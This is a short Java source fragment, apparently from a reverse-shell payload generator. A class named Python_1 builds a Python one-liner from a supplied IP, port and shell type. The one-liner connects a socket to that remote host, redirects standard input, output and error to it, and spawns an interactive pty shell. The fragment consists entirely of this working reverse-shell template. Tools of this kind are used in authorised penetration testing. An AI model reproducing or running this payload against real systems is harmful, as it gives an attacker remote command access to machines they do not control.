    ...
    public class Python_1 extends Reverse {

        protected String shellFormat = "";

        public Python_1(String localIP, int localPort, LISTENER listener, SHELLS shellType){
            super(localIP, localPort, listener, shellType);
            shellFormat = String.format("export RHOST=\"%s\";export RPORT=%s;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"%s\")'",this.getLocalIP() ,this.getLocalPort(), this.getShell() );
        }
